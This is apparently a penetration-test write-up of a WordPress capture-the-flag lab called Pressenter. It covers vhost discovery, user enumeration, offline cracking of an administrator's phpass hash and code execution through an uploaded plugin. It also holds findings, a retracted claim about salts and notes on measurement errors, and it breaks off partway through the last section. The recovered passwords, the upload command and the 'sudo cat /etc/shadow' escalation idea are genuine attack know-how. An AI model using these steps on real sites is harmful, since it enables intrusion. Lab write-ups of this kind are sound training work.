# 117 Pressenter — writeup

**Class (from the artefact, not from the queue):** WordPress 6.6.1 on Ubuntu 24.04,
Apache 2.4.58, PHP 8.3.6, MySQL 8.0.39, single container, one virtual host
`pressenter.hl` on `:80`.
**Chain reached:** unauthenticated HTTP → authenticated WordPress administrator
(`pressi`) → arbitrary PHP file write → **code execution as `uid=33(www-data)`**.
**Root:** not reached. The lab's advertised Linux escalation is unreachable as
shipped — see Finding 6, which is a finding about the lab, not a step I skipped.

Everything below is quoted from the artefact or from live output captured during
this engagement. Where a number is a count, it is a count I measured.

---

## 0. The manifest's platform label, checked against the artefact

`tooling/labs.manifest:54` and the platform catalog (`~/dockerlabs/catalog.txt:123`,
`117|Pressenter|facil|Laboratorio para practicar la enumeración y explotación de WordPress
con wpscan, y escalada de privilegios en Linux.`) both label this **WordPress**.

**The label is correct.** Verified from the version-bearing file, not from the label:

```
$ docker exec pressenter_container sh -c "sed -n '15,30p' /var/www/pressenter/wp-includes/version.php"
$wp_version = '6.6.1';
$wp_db_version = 57155;
```
(`/var/www/pressenter/wp-includes/version.php:19` and `:26`)

Two independent HTTP-observable confirmations of the same number:

```
$ curl -s -H 'Host: pressenter.hl' http://172.17.0.10/ | grep -o 'name="generator" content="[^"]*"' | sort -u
name="generator" content="WordPress 6.6.1"
$ ... | grep -oE 'ver=[0-9.]+' | sort -u
ver=1.8.2
ver=6.6.1
```

**The docroot is not where a first look lands, and that is the trap in this lab.**
Apache answers two vhosts on the same port. `/var/www/html` is a three-file static
decoy and `/var/www/pressenter` is WordPress:

```
$ docker exec pressenter_container sh -c 'ls -la /var/www/html/'
-rw-r--r-- 1 root root 2187 Aug 22  2024 index.html
-rw-r--r-- 1 root root 1483 Aug 22  2024 register.html
-rw-r--r-- 1 root root 2651 Aug 22  2024 styles.css
```

```
/etc/apache2/sites-available/pressenter.conf
 1  <VirtualHost *:80>
 2      ServerName pressenter.hl
 3      DocumentRoot /var/www/pressenter
 4
 5      <Directory /var/www/pressenter>
 6          AllowOverride All
 7          Require all granted
 8      </Directory>
 9
10      ErrorLog ${APACHE_LOG_DIR}/pressenter_error.log
11      CustomLog ${APACHE_LOG_DIR}/pressenter_access.log combined
12  </VirtualHost>
```

The decoy names the real vhost, in a `hidden-domain` class, in both decoy pages
(`/var/www/html/index.html:51` and `/var/www/html/register.html:37`):

```
51      <p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
```

### Vhost discrimination, with a control that cannot exist

Four `Host` values, one normalised body hash each:

| `Host:` sent | HTTP | bytes | sha256 (first 16) |
|---|---|---|---|
| `pressenter.hl` | 200 | **84 298** | `f7544db642525ce7` |
| `bogus-nonexistent-tld.invalid` | 200 | 2 187 | `728a20e4ce3b9aeb` |
| `pressenter.local` | 200 | 2 187 | `728a20e4ce3b9aeb` |
| `172.17.0.10` | 200 | 2 187 | `728a20e4ce3b9aeb` |

The invented TLD and two other names share one hash: that is the baseline (the
decoy). One name differs by 82 111 bytes. A flat wordlist that never tried
`pressenter.hl` would have reported "three static pages, no CMS" — a clean
negative that is wrong.

### Version drift: not tested, and why

`/var/www/pressenter/wp-config.php` contains **no** `DISALLOW_FILE_EDIT`,
`DISALLOW_FILE_MODS`, `AUTOMATIC_UPDATER_DISABLED` or `WP_AUTO_UPDATE_CORE`
(1 pattern set, 0 matches — `grep -nE 'DISALLOW_FILE|FS_METHOD|AUTOMATIC_UPDATER|WP_AUTO' wp-config.php` → exit 1),
and the DB has `auto_update_core_major = enabled`. The RUNBOOK's documented drift
condition is therefore **live in this lab**. It did not fire during this
engagement: `wp-includes/version.php:19` read `6.6.1` at deploy time and again
after ~20 minutes of work, and the HTTP `generator` meta agreed both times.
The WordPress admin surfaces advertise **`WordPress 7.1.2` is available** — that
is an *available* update, not an applied one, and the two numbers mean different
things. See **NOT tested**.

---

## Surface

```
$ nmap -sV -Pn -p- 172.17.0.10
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Full-TCP: **1 open port of 65 536 scanned.** Non-TCP, measured three ways:

| Check | Work | Result |
|---|---|---|
| `docker inspect … .Config.ExposedPorts` | 1 image | `null` |
| `/proc/net/udp` | read whole file | 1 line = header, **0 sockets** |
| `/proc/net/udp6` | read whole file | 1 line = header, **0 sockets** |
| `/proc/net/tcp` | 10 socket rows | 3 `LISTEN`: `0.0.0.0:80`, `127.0.0.1:3306`, `127.0.0.1:33060` |

`127.0.0.1:0CEA` = 3306 and `127.0.0.1:8124` = 33060 in `/proc/net/tcp` hex. MySQL is
**loopback-only**, so the DB credentials in `wp-config.php` are not reachable from
the network — a negative with a count, and it matters for the escalation analysis.

Identity at the first hop, measured as the identity (operator console, before any
attack):

```
$ docker exec pressenter_container id
uid=0(root) gid=0(root) groups=0(root)
$ docker exec pressenter_container sh -c "grep -E '^(Uid|Gid)' /proc/self/status"
Uid:	0	0	0	0
Gid:	0	0	0	0
```

WordPress surface, 6 paths, one request each:

| Path | HTTP | bytes |
|---|---|---|
| `/wp-login.php` | 200 | 6 569 |
| `/wp-json/` | **404** | 275 |
| `/?rest_route=/` | 200 | 202 698 |
| `/xmlrpc.php` | 405 | 42 |
| `/readme.html` | 200 | 7 409 |
| `/wp-admin/` | 302 → `/wp-login.php` | 0 |

**`/wp-json/` 404 is a blind spot, not an absence.** Permalinks are plain, so the
API lives at `index.php?rest_route=/` (200, 202 698 bytes). A `/wp-json/` probe
alone would have reported "REST disabled" and missed the user enumeration below.

Users, from `?author=N`, **ids 1–10 tried, 10 responses, 2 non-baseline**:

| id | bytes | title |
|---|---|---|
| 1 | 63 824 | `pressi – PressEnter` |
| 2 | 56 821 | `Hacker – PressEnter` |
| 3–10 (8 ids) | 56 618 each | `Página no encontrada – PressEnter` |

The 8 identical 56 618-byte 404 bodies are the control: an id that does not exist
is byte-identical to every other id that does not exist, and differs from both that
do. Cross-checked against the REST API, which is a second tool and agrees on the
login name:

```
$ curl -s -H 'Host: pressenter.hl' 'http://172.17.0.10/index.php?rest_route=/wp/v2/users'
[ { "id": 1, "name": "pressi", "slug": "pressi", ... } ]
```
`/wp/v2/users/2` → 401, 118 bytes, `rest_user_cannot_view`. Content: 1 post
(default "¡Hola, mundo!") and 1 page (a Spanish story about a journalist and a
hacker). **No credential in any post or page** — read in full, 5 189 characters of
page body, 118 characters of post body.

Plugins: `hello.php` and `php-compatibility-checker` (both stock). Themes:
`twentytwentyfour`, `twentytwentythree`, `twentytwentytwo` (all stock). **No
vulnerable third-party component**, so the entry is credentials, as the catalog says.

---

## The class

**Entry criterion:** does the filter read `mimetype`, and is there a weak credential
on the only reachable service?
**Source that settled it:** `/var/www/pressenter/wp-includes/version.php:19` (platform
and version), and the credentials themselves — Finding 2.

---

## Chain

Every row's identity is quoted, not summarised. `uid`/`euid`/`fsuid` are the four
columns WordPress' own `wp_validate_auth_cookie` and `/proc/self/status` report, so
a setuid transition could not hide.

| # | → | Mechanism | Identity proof (verbatim) |
|---|---|---|---|
| 0 | operator console | `docker exec` before any attack | `uid=0(root) gid=0(root) groups=0(root)` / `Uid:\t0\t0\t0\t0` |
| 1 | unauthenticated | `Host: pressenter.hl` → `:80`, vhost 2 of 2 | none — no identity claimed |
| 2 | `pressi` (WordPress administrator) | offline phpass recovery of `$P$…`, then `wp-login.php` POST | `Set-Cookie: wordpress_logged_in_e7a137efe822bd6c55d151ff31374727=<TRUNCATED — username, session start and HMAC redacted; the raw capture is in `evidence/login-ok.txt:10`>`; `Location: …/wp-admin/`; `GET /wp-admin/` with cookie → `200`, 88 116 bytes, `<title>Escritorio &lt; PressEnter — WordPress</title>` |
| 3 | `uid=33(www-data)` | ZIP upload → `update.php?action=upload-plugin` → activate → HTTP | see hop 3 detail below |

### Hop 2 — credential recovery, with the oracle proven green first

Both WordPress users store **phpass** (`$P$`) hashes:

```
ID  user_login  user_pass                             user_email                role
1   pressi      $P$BeinDKnzoAYpx.wCePjkJeVNV5plCW.   pressenter@gmail.com      administrator
2   hacker      $P$BiO9aZSB4m/CMeGjq3o4PPaE4ipdIt/   hacker@gmail.com          subscriber
```

Cracked with **the target's own** `wp-includes/class-phpass.php` (not a
reimplementation, so the oracle cannot disagree with the server):

```
POSITIVE_CONTROL hash=$P$Bai2JSuOg3KC9SdynbA8F3VJjQovUZ. correct_pw_returns=true wrong_pw_returns=false
ORACLE_FIRED=true
CRACK user=pressi password=dumbass line=32518
TOTAL_TRIED=101071 MATCHES=1
```

Work count: **101 071 candidates, 1 match** (`sorted-passwords.txt`, 1 010 074 lines,
101 071 non-empty). A first, smaller sweep of 76 lab-themed candidates returned
`TOTAL_TRIED=76 MATCHES=0`; that was a *tested* negative, and a cross-check proved
the large sweep was not truncated in a way that mattered — `grep -icx -e pressenter
-e pressi -e pressi123 sorted-passwords.txt` → **0**, i.e. the 76 themed candidates
were genuinely absent from the 101 071, so the two sweeps covered disjoint ground
and neither was silently cut.

### Hop 2 auth control, positive and negative, both green

`/wp-admin/` with redirect following **disabled** (`curl` default), asserting on
final status and body bytes, not on a body marker the error page could fake:

| Request | HTTP | bytes | body marker |
|---|---|---|---|
| `GET /wp-admin/` **with** session cookie | **200** | **88 116** | `<title>Escritorio &lt; PressEnter — WordPress</title>` |
| `GET /wp-admin/` **without** cookie | **302** | **0** | `Location: …/wp-login.php?…&reauth=1` |

The two branches differ by 88 116 bytes and by status, so the negative control is
not a coincidence (§16).

### Hop 3 — RCE as `uid=33(www-data)`, identity proven three ways

Payload written through the WordPress **plugin ZIP installer**, which extracts with
`unzip_file()` and performs **no** fatal-error loopback check:

```
$ curl -F "pluginzip=@pe117shell.zip;type=application/zip" … \
    'http://172.17.0.10/wp-admin/update.php?action=upload-plugin'
$ docker exec pressenter_container ls -la /var/www/pressenter/wp-content/plugins/pe117shell/
-rwxr-xr-x 1 www-data www-data 1044 Sep 30 10:32 pe117shell.php
```

Subprocess identity (`shell_exec('id')`, verbatim response body):

```
PE117_MARKER_9f3c1a7d
--- id ---
uid=33(www-data) gid=33(www-data) groups=33(www-data)
--- euid/egid ---
33
--- cwd ---
/var/www/pressenter
```

PHP-native identity — reading `/proc/self/status` from the interpreter itself, with
no subprocess in the way, plus every Apache process in `/proc`:

```
PE117ID_MARKER_51b7e2a4
--- PHP-native /proc/self/status (the Apache/PHP process itself, no subprocess) ---
Name:	apache2
Pid:	29
PPid:	24
Uid:	33	33	33	33
Gid:	33	33	33	33
Groups:	33
--- apache worker pids and their Uid lines from /proc ---
24 comm=apache2 Uid:0 0 0 0
288 comm=apache2 Uid:33 33 33 33
29 comm=apache2 Uid:33 33 33 33
30 comm=apache2 Uid:33 33 33 33
31 comm=apache2 Uid:33 33 33 33
32 comm=apache2 Uid:33 33 33 33
33 comm=apache2 Uid:33 33 33 33
--- realpath of this plugin (proves the write primitive landed here) ---
/var/www/pressenter/wp-content/plugins/pe117id/pe117id.php
--- stat of the file (owner = the identity that wrote it) ---
uid=33 gid=33 mode=0755
```

**No setuid transition occurred.** `Uid: 33 33 33 33` is real/effective/saved/fs, all
33. PID 29 is a `mod_prefork` worker of PID 24, the root-owned master — the boundary
is crossed at the `fork`, not by any setuid bit. `fileowner()` on the written file
returns 33, which is a third, independent confirmation that the writer was `www-data`
and not root.

---

## Findings

### Finding 1 — Weak administrator password on the only reachable service
**CWE-521 (Weak Requirements) / CWE-287.** WordPress administrator `pressi`
(recovered above) is the sole externally reachable service's only credential. Impact:
full administrative control of the CMS, including the file editor and the plugin
installer, i.e. Finding 3. Root cause: a human-chosen low-entropy password, present
in a generic 101 k-line wordlist at line 32 518. Remediation: unique generated
password, MFA on `wp-login.php`, rate limiting on `/wp-login.php` and `xmlrpc.php`.

### Finding 2 — World-readable `wp-config.php` with hardcoded credentials
**CWE-732 (Incorrect Permission Assignment) + CWE-798 (Hardcoded Credentials).**
`/var/www/pressenter/wp-config.php` is `root:root 0644`, quoted:

```
23  define( 'DB_NAME', 'wordpress' );
26  define( 'DB_USER', 'admin' );
29  define( 'DB_PASSWORD', 'rooteable' );
32  define( 'DB_HOST', '127.0.0.1' );
```

Measured as the executing identity, not as root:

```
/root                                    readable=0 writable=0
/root/root.txt                           readable=0 writable=0
/etc/shadow                              readable=0 writable=0
/home/enter                              readable=0 writable=0
/var/www/pressenter                      readable=1 writable=1
/var/www/pressenter/.htaccess            readable=1 writable=1
/var/www/pressenter/wp-config.php        readable=1 writable=0
```

Any local account on the host can read the database password. `mysql -uadmin
-prooteable -h127.0.0.1` authenticates, and `admin` holds
`GRANT ALL PRIVILEGES ON wordpress.* TO 'admin'@'localhost'` — full read/write on
the CMS database, including the ability to rewrite any user's password. Impact is
bounded in this lab only by the fact that MySQL listens on `127.0.0.1` alone.
Remediation: `0640 root:www-data`.

### Finding 3 — Authenticated administrator can write and execute arbitrary PHP (no file editor)
**CWE-434 (Unrestricted Upload of File with Dangerous Type) / CWE-94.** Any account
in the `administrator` role can upload a plugin ZIP whose PHP is written straight
into `wp-content/plugins/` and is then executable over HTTP, with **no** code
validation, no loopback, and no `AllowOverride` interaction. Evidence: hop 3, and the
installed artefact at `/var/www/pressenter/wp-content/plugins/pe117shell/pe117shell.php`
(1 044 bytes, `www-data:www-data 0755`).

The contrast is the interesting part and it is measured, not asserted: the **theme
editor's** own safety check (write → loopback request to itself → revert on fatal
error) **held** and blocked the same payload, while the **plugin installer's**
equivalent path has no such check. See *Controls that held*, control 1.

Remediation: set `DISALLOW_FILE_EDIT` and `DISALLOW_FILE_MODS` in `wp-config.php`
(neither is defined here — 1 pattern set, 0 matches), and treat administrator
credentials as equivalent to code execution in any design that keeps them usable.

### Finding 4 — WITHDRAWN — All eight authentication keys are the WordPress install placeholder

> **⚠️ WITHDRAWN (`60e0612`).** The eight constants are the install placeholder, and that is
> still a CWE-321 hygiene defect in the shipped file — but the **impact claimed below does
> not hold on this artefact**. WordPress *ignores* the placeholder and uses the generated
> `wp_options` values, so no cookie key is forgeable offline from this file. Retracted by
> `60e0612` after lab 108 and this lab contradicted each other; the core settled it. The body
> is kept unedited because it is what the mistake looked like.

**CWE-321 (Hardcoded Cryptographic Key) / CWE-798.** `/var/www/pressenter/wp-config.php:51-58`:

```
51  define( 'AUTH_KEY',         'put your unique phrase here' );
52  define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
53  define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
54  define( 'NONCE_KEY',        'put your unique phrase here' );
55  define( 'AUTH_SALT',        'put your unique phrase here' );
56  define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
57  define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
58  define( 'NONCE_SALT',       'put your unique phrase here' );
```

**This finding is withdrawn.** The eight constants are indeed the install
placeholder, and the writeup above quotes the measurement that shows the opposite
of what it concluded. Both findings 4 and the "placeholder salts make a recovered
hash forgeable" claim in Finding 5 are retracted; the evidence is left in place
because it is what the mistake looked like.

**What the core actually does.** `wp_salt()` — `wp-includes/pluggable.php:2424` in
this lab's WordPress 6.6.1 — pre-seeds its duplicate list with the literal
installer string and then skips any constant whose value is in it:

```
2424  function wp_salt( $scheme = 'auth' ) {
2442      'put your unique phrase here' => true,
2450      $duplicated_keys[ __( 'put your unique phrase here' ) ] = true;
2467  if ( defined( 'SECRET_KEY' ) && SECRET_KEY && empty( $duplicated_keys[ SECRET_KEY ] ) ) {
2468      $values['key'] = SECRET_KEY;
```

`empty( $duplicated_keys[ 'put your unique phrase here' ] )` is **true**, so the
constant is skipped and `wp_salt()` falls through to the generated value in
`wp_options`. **The config value is ignored, not overriding.** Measured against
this same container:

```
constant AUTH_KEY      : put your unique phrase here
wp_salt('auth')[:34]   : q5nFbcdR0_`D;lxe}>[Oal%++~?h688^Cs
uses the placeholder?  : NO
wp_options auth_key[:34]: q5nFbcdR0_`D;lxe}>[Oal%++~?h688^Cs
```

**What the original evidence already showed.** `wp_salt('auth') strlen=128` — a
27-character placeholder (`put your unique phrase here`, measured by lab 102) cannot
produce a 128-character salt, so the quoted output
was already refuting the conclusion drawn beside it. The mistake was reading
`AUTH_KEY defined: true` (trivially true of any constant) as evidence of which
value WordPress *uses*, and reading the adjacency of two printed values as a
precedence relationship. The control that should have caught it is the obvious
one: ask the framework for the value instead of asking PHP whether a constant
exists. Lab 108 ran that test and its offline forgery from the placeholder was
**rejected**.

CWE-321 still describes the shipped file: eight identical placeholder constants
are a real hygiene defect and should be regenerated. But the impact claimed here —
a cookie key derived from a public constant, forgeable offline — **does not hold**
on this artefact, and neither does Finding 5's composition.

**Generalised, because the shape will recur:** `defined( 'X' )` proves a constant
exists. It says nothing about whether the framework reads it. A framework that
validates, defaults, or overrides configuration will frequently ignore a value
that is present and syntactically fine. **Measure the value the framework
consumes, not the value the file contains.**

```
PE117SALT_MARKER_c3d81f60
AUTH_KEY defined: true value='put your unique phrase here'
LOGGED_IN_KEY defined: true
wp_salt('auth') strlen=128 md5=f145b6d3065a3d7ffb24637b841096ad
DB option auth_key (raw, first 20)=q5nFbcdR0_`D;lxe}>[O
COOKIE_VALIDATES=true user_id= user_login=
COOKIE_NEGCTRL_VALIDATES=false
```

`COOKIE_VALIDATES=true` is the detector firing on a cookie I actually hold;
`COOKIE_NEGCTRL_VALIDATES=false` is the same detector on that cookie with one
character changed. Both branches proven, so the boolean means something.

> **⚠️ RETRACTED (`60e0612`).** The two paragraphs that followed here claimed that
> `AUTH_KEY` is the key `wp_salt()` returns — "the DB copies are **not** the ones in use",
> the opposite of what this writeup now concludes above. That claim is **retracted**: the
> core skips the placeholder and uses the `wp_options` values. Both readings were recorded
> here, and the adjudication is at *What the core actually does* above.

Impact as originally written (retracted, kept for the record): WordPress' session cookie is
`HMAC-SHA256(…, key)` where `key` derives from a **public constant**. An attacker
who obtains a user's password hash — from a SQL injection, a backup, a second-order
read, or the Finding 2 database access — could forge an authenticated session cookie
for that user **offline**, on any host, with no access to this server. This is the impact
that does **not** survive retraction: `key` comes from `wp_options`, not from the
placeholder, and the placeholder is not a path to the live value either. No forgery is
claimed here in either direction.

Remediation for the hygiene defect that remains: generate all eight with
`https://api.wordpress.org/secret-key/1.1/salt/` and store them outside the document
tree. **Correction to the sentence that stood here:** the config value is **ignored**,
not "not dead weight" — the `wp_options` copies are the ones in use.

### Finding 5 — Password hashes readable through the `wp-config.php` DB credential
**CWE-522 (Insufficiently Protected Credentials).** Composition of Findings 2 and 4 —
with the second half **retracted** (`60e0612`, see Finding 4): `admin`/`rooteable` yields
`wordpress.wp_users.user_pass` for both accounts, which is the finding; the "placeholder
salts make a recovered hash forgeable" clause is **withdrawn**, because the placeholder
salts are not the ones in use. One query:
`select ID,user_login,user_pass from wordpress.wp_users;` returned 2 rows. Not
independently rated — it is the composition, and it is listed so the two halves are
not read as harmless.

### Finding 6 — The advertised Linux escalation is unreachable: `enter` can never be logged into
**Lab-design finding, and the reason this writeup has no root row.**
`/etc/sudoers:59-60`:

```
59  enter ALL=(ALL:ALL) NOPASSWD: /usr/bin/cat
60  enter ALL=(ALL:ALL) NOPASSWD: /usr/bin/whoami
```

`/etc/passwd:20`: `enter:x:1001:1001:enter,,,:/home/enter:/bin/bash`. The intended
end state is `sudo cat /root/root.txt` as `enter`. **No route to `enter` exists.**
Each escape was searched, with counts:

| Escape searched | Work count | Result |
|---|---|---|
| Any login service | 65 536 TCP ports scanned | only `:80`; no `sshd` binary, `/etc/ssh` absent, no `getty` in a container |
| Group/world-writable **files** outside the web tree | `find / -xdev -type f -perm /022`, all 10 633 files | **0** matches after excluding `/tmp`, `/var/www`, `/var/lib/mysql`, `/run`, `/var/log`, `/dev` |
| Group/world-writable **directories** | `find / -xdev -type d -perm /022` | **5**: `/usr/local/share/fonts`, `/var/mail`, `/var/tmp`, `/var/lib/php/sessions`, `/var/local` — none on `sudo`'s `secure_path` and none an execution path |
| Custom setuid/setgid binary | `find / -xdev \( -perm -4000 -o -perm -2000 \) -type f` | **13**, all stock Ubuntu (`passwd`, `su`, `sudo`, `mount`, `newgrp`, …); 0 custom |
| MySQL as a file-read/write primitive | 1 account inspected: `admin@localhost` | `GRANT USAGE ON *.*` + `wordpress.*` only — **no `FILE`, no `SUPER`**; `@@secure_file_priv = /var/lib/mysql-files/`; `mysql` is **not** in group `shadow` |
| ACL-based grant | `getfacl` | not installed; no `+` in any mode string read |
| Unprivileged cron | `/etc/cron.d/` (2 files) + `/var/spool/cron` | `e2scrub_all`, `php` (session GC, runs as `root`); `/var/spool/cron` does not exist; `crontab` not installed |
| Plaintext credential for `enter` anywhere on disk | `grep -rIl dumbass /` excluding `/proc /sys /dev` | **1** hit, and it is the wordlist itself: `/usr/share/mysql/dictionary.txt` |
| `enter`'s password vs the wordlist shipped **on the box** | 3 549 candidates (3 538 dictionary lines + 11 themed), oracle green | **0** matches |

The `sudoers` rule is still a real weakness, filed as such: `NOPASSWD: /usr/bin/cat`
for a non-root account is a privilege-escalation primitive the moment **any**
`enter` foothold exists in any other lab that reuses this image, because
`sudo cat /etc/shadow` hands over the hashes. But in *this* container there is no
such foothold, so the escalation the catalog advertises is not completable. Per
RUNBOOK §8 this is reported as its own finding rather than merged into the chain,
because merging it would tell a reader I escalated and I did not.

Remediation for the lab: add an `enter` login surface (sshd, or a sudo rule the
`www-data`-reachable path can actually use), or drop the sudoers rule and the
`/root/root.txt` target. `NOPASSWD: /usr/bin/cat` should be `r-- /root/root.txt`
at most.

### Finding 7 — `/root/root.txt` is a decoy
`/root/root.txt`, 52 bytes, verbatim:

```
It's not going to be that easy, keep trying hehe.
```

`/root/root_true.txt` (33 bytes) and `/home/enter/user.txt` (33 bytes) hold
`4e4a603de810988e0842777de1d97e68` and `4a05a7bc45edb56b1f033ca1606e176c`
respectively — bare MD5 digests with no `key{}` wrapper. `md5("dumbass")` is
`b529d8871187ecc7fe5f152142b3440a`, which is **not** the `user.txt` value, so the
digest is not a confirmation of the recovered password. Reported as an observation;
I did not attempt to invert either digest.

---

## Controls that held

| # | Control | Positive control that proves this detector works |
|---|---|---|
| 1 | **WordPress theme-editor fatal-error rollback.** `wp_edit_theme_plugin_file()` writes the file, then makes a loopback request to `admin_url()` and reverts if it cannot scrape a clean result. It reverted my payload: file stayed 5 543 bytes, and the error code was surfaced verbatim — `No ha sido posible comunicar con el sitio para comprobar los errores fatales, así que el cambio de PHP se ha revertido.` (`loopback_request_failed`). | Proven both ways: the **same** save path succeeded byte-for-byte in structure when the file was valid PHP (`php -l` → `No syntax errors detected`), and a deliberately corrupted `functions.php` produced `PHP Parse error: syntax error, unexpected end of file … on line 207`, which is the detector firing on a real fatal. The rollback was not the reason the *valid* save failed — see control 2. |
| 2 | **Loopback cannot reach the vhost.** The lab's own fatal-error check is unmeetable, because the loopback resolves `siteurl` to `pressenter.hl` and the name does not exist inside the container. | Resolver proven green first: `getent hosts localhost` → `::1 localhost ip6-localhost ip6-loopback` (rc 0). Then 1 lookup of `pressenter.hl`: `rc=2`, **0** addresses returned. `/etc/hosts` has 7 lines, none for `pressenter.hl`; `/etc/resolv.conf` points at `192.168.100.1`. Second tool unavailable and recorded as such: `python3` is not installed in the container. |
| 3 | **Apache vhost selection.** Only `ServerName pressenter.hl` reaches WordPress; the default vhost serves the decoy. | The invented-TLD control: `bogus-nonexistent-tld.invalid` shares the baseline hash `728a20e4ce3b9aeb` with `pressenter.local` and `172.17.0.10`, while `pressenter.hl` returns a different hash and 82 111 more bytes. A name that cannot exist returns the baseline, so the hash difference is the vhost and not the scanner. |
| 4 | **`/root`, `/etc/shadow` and `/home/enter` are not readable by `uid=33`.** | Measured as `uid=33` itself, 7 paths probed in one PHP process: 3 × `readable=0` above. Second tool for the filesystem shape: `ls -ld /root` → `drwx------ 1 root root`; `ls -l /etc/shadow` → `-rw-r----- 1 root shadow`. The write side is separately positive — the same call reports `/var/www/pressenter writable=1`, so the probe is not silently returning 0 for everything. |
| 5 | **phpass recovery oracle.** | `correct_pw_returns=true wrong_pw_returns=false` on a hash the harness generated itself with the target's own `class-phpass.php`, printed before the 101 071-candidate sweep. |
| 6 | **yescrypt verification oracle** (used for the `enter` password sweep). | `POSITIVE_CONTROL yescrypt_roundtrip=true scheme=$y$j9` — `crypt()` round-tripped a known marker under the `$y$` scheme on the host before 3 549 candidates were tried. This control earned its place: see Instrumentation defect 2. |
| 7 | **Filesystem `grep` for the reward.** | `grep -rIo 'Welcome to Pressenter CTF' /var/www/html` → **1** occurrence, i.e. the instrument can find a string that is there. |
| 8 | **SQL `LIKE` for the reward.** | `select count(*) from wp_options where option_value like '%PressEnter%'` → **4** rows, against 174 rows scanned. The `LIKE` predicate matches when there is something to match. |

---

## NOT tested (a count of zero would mean untested; these have reasons, not zeros)

1. **Unauthenticated session-cookie forgery** using the placeholder salts
   (Finding 4). Requires `substr(user_pass, 8, 4)` per user. The only copy of
   `user_pass` I read came from the operator's root console, so forging with it
   would not be a chain I earned. Untested, not negative.
2. **Whether a `wp-cron.php` request auto-updates core 6.6.1 → 7.1.2.** Everything
   that would make it happen is present and measured (`auto_update_core_major =
   enabled`; 0 matches for `AUTOMATIC_UPDATER_DISABLED` in `wp-config.php`; the admin
   surfaces advertise 7.1.2), and it did **not** fire unprompted over ~20 minutes
   (`version.php:19` = `6.6.1` at both readings). I did not trigger it deliberately,
   because a core update would change the artefact underneath every citation in this
   document.
3. **Whether `xmlrpc.php` `system.multicall` amplifies Finding 1.** `POST` to
   `/xmlrpc.php` returned `405` for a bare `GET`; I did not measure the
   authentication rate limit or the multicall batch size. Counted as unmeasured.
4. **`sudo cat` behaviour as `enter`.** Not executed. It is unreachable (Finding 6)
   and `/root/root.txt` is a decoy (Finding 7), so executing it would add no
   evidence about a finding.
5. **Inverting the two MD5 digests** in `root_true.txt` and `user.txt`.
6. **The `hacker` subscriber account's password.** It was included in every phpass
   sweep (2 targets × 101 071 candidates) and produced 0 matches. That is a tested
   negative, not an untested one; it is listed here only because a subscriber
   foothold was never pursued.
7. **The decoy vhost's own attack surface.** `/var/www/html` is 3 static files with
   `form action="#"` and no server-side handler; I read all 3 (2 187 + 1 483 + 2 651
   bytes) and did not probe it.

## Discarded with reason

1. **MySQL as a privilege-escalation primitive** — discarded on evidence, not on
   suspicion: `admin@localhost` has no `FILE` and no `SUPER`, `secure_file_priv` is
   set to `/var/lib/mysql-files/`, and `mysql` is not in group `shadow`. Three
   independent reasons; 1 account inspected.
2. **`.htaccess` → RCE as a route to a higher identity.** `AllowOverride All` at
   `pressenter.conf:6` and `.htaccess` is `writable=1` for `uid=33` — the primitive
   is real and I confirmed it. Discarded because the directives it accepts
   (`AddType`, `SetHandler`, `php_value`, `Options +ExecCGI`) only ever produce code
   running as `uid=33`, which is where I already am. Recorded as a finding
   observation, not a step.
3. **Bulk-enumeration negatives I did not use.** `find` for setuid, writable files
   and cron was run as **root** via `docker exec` and is therefore a statement about
   the filesystem, not about a low-privilege boundary. Every one of those negatives
   that I *did* rely on was re-measured from inside the `uid=33` process
   (`is_readable`/`is_writable` on 7 named paths, control 4), and those are the
   numbers I report.

---

## Instrumentation defects

This is the part worth reading. Four, all of which produced well-formed output.

### 1. `ss` does not exist, and `||` hid it
My first listening-socket probe was
`docker exec … sh -c 'ss -lntup 2>/dev/null || netstat -lntup'`. `ss` is not
installed; `2>/dev/null` discarded the error; `netstat` is not installed either and
printed `sh: 1: netstat: not found` **outside** the redirect. The command's net
result was **empty**, which reads exactly like "no listening sockets beyond what
nmap found" — a negative I was one step from filing. Caught by asking for
`command -v ss` explicitly, which returned `sh: 1: ss: not found`. Replaced with
`/proc/net/tcp`, `/proc/net/udp` and `/proc/net/udp6`, which carry their own work
counts (10 / 1 / 1 lines read) and cannot return a silent zero. Same family as
`find -writable` in the catalogue: **a tool that does nothing and a tool that finds
nothing print the same thing.**

### 2. `crypt()` returned `*0` for a `$y$` hash — 3 538 candidates "tested", KDF never ran
I cracked `enter`'s shadow hash inside the container with PHP's `crypt()`. Every
candidate returned the same answer, and the answer was `*0`:

```
CTRL_HASH='*0'
CTRL_ROUNDTRIP=false
```

PHP's bundled `crypt` implements DES/MD5/SHA/Blowfish/argon2 and **not** yescrypt,
so a `$y$j9T$…` salt is rejected outright. The uniform `*0` is the §5 signature of a
broken search, and had I not run the positive control first, the honest-looking
output would have been `TOTAL_TRIED=3538 MATCHES=0` — a clean, confident, wrong
negative, filed as "the password is not in the wordlist". The control caught it
before any negative was believed. Re-run on the host with Perl, where `crypt()` goes
through libxcrypt: `POSITIVE_CONTROL yescrypt_roundtrip=true scheme=$y$j9`, then
`TOTAL_TRIED=3549 MATCHES=0` — this time a real negative. The tell here was the
answer's *shape* (`*0`, 2 characters), exactly as the catalogue's lab-36 case was
caught by an implausible rate.

### 3. A successful login returns HTTP 200 with an error body
My first login POST omitted the `wordpress_test_cookie`, so WordPress authenticated
the user, issued the session cookies, and then re-rendered the login form with
`Error: las cookies están bloqueadas o no permitidas por tu navegador` — an
**error body on a successful authentication**, at HTTP 200, in a response the same
size class as a failed login. A detector asserting on status code, or on the
presence of `id="login_error"`, would have reported the *successful* login as a
failure. What distinguished them was the header, not the body:

```
login-ok.txt   7 965 bytes  sha256 ecdf17220031a2eab6f687de51e7b0e7ed4c110264201572e490bfaee3a5ecf7
login-bad.txt  7 308 bytes  sha256 071d42669717e8876cab91657a1dcf2b2d497eea4ad7a013e7130b33d36d79f3
```

and the three `Set-Cookie` lines present in one and absent in the other. The
session-establishing form of the oracle is the *absence of `id="login_error"`* plus
a `302` to `wp-admin/`, with a two-step cookie jar; only then does `/wp-admin/`
return 200 / 88 116 bytes. This is the §16 shape: a status code that cannot
distinguish success from failure, and a detector that is always-true if you let it
be.

### 4. `docker exec` is root, and I broke the target with it
Two consequences, both mine.

